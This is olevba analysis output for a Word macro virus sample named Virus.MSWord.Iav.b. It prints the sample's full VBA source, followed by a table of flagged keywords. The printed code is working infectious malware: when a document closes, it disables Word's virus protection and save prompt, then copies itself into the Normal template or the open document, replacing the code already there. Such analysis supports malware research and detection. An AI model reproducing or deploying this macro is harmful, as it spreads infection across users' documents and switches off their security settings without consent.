olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Iav.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Iav.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Private strCode As String
Private Sub Document_Close()
With Options
.SaveNormalPrompt = False
.VirusProtection = False
End With
Dim tdCode As Object
Set tdCode = GetCodeModule(ThisDocument)
With tdCode
strCode = .Lines(1, .CountOfLines)
End With
If ThisDocument = NormalTemplate Then
With ActiveDocument
If .Path <> vbNullString Then
SendCode ActiveDocument
.Save
End If
End With
Else
SendCode NormalTemplate
End If
If Day(Now) = 13 Then
MsgBox "Ïðèâåò! À ÿ - âèðóñ!", vbExclamation + vbOKOnly, "Ñîîáùåíèå"
End If
End Sub
Private Function GetCodeModule(objProject As Object) As Object
Set GetCodeModule = objProject.VBProject.VBComponents(1).CodeModule
End Function
Private Sub SendCode(objProject As Object)
Dim objCode As Object
Set objCode = GetCodeModule(objProject)
With objCode
.DeleteLines 1, .CountOfLines
.AddFromString strCode
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

